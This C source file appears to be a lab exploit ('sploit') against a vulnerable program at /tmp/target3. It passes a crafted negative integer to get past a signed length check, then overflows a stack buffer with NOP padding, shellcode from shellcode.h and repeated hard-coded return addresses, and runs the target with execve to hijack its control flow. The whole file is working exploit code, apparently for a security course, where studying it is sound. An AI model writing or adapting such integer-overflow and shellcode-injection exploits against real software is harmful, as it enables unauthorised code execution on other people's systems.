#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define BUF_SIZE (830*32)

int main(void)
{
  //decimal neg number 4160750398 << 5  == 830 << 5, 
  //4160750398 = 11111000000000000000001100111110 < 829 in signed comparison
  char *args[3];
  char *env[1];

  char negInt[11] = "4160750398,"; 
  char buffer[BUF_SIZE];  

  int index = 0;
  // add neg int to buffer
  for(index = 0; index < 12; index++) {
      buffer[index] = negInt[index];
  }
  //in foo, buf starts from addr == 0xbfff2ec0
  buffer[index++] = 0x90; // padding add nop
  buffer[index++] = 0x90; // padding add nop
  buffer[index++] = 0x90; // padding add nop
  // add shellcode to buffer 12 + 45 = 57 
  for(; index <  15+strlen(shellcode); index++){
      buffer[index] = shellcode[index-15];
  }
  //padding 
  buffer[index++] = 0x90; // add nop
  buffer[index++] = 0x90; // add nop
  buffer[index++] = 0x90; // add nop
  // printf("index %d\n", index);

  //fill in all the rest with shellcode addr
  for(; index < BUF_SIZE; index+=4) {
    *((int *) (buffer + index)) = 0xbfff2ec4;  // buf addr+4, skip ",90909090"
  }
  
  // printf("index %d\n", index);
  args[0] = TARGET; 
  args[1] = buffer;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}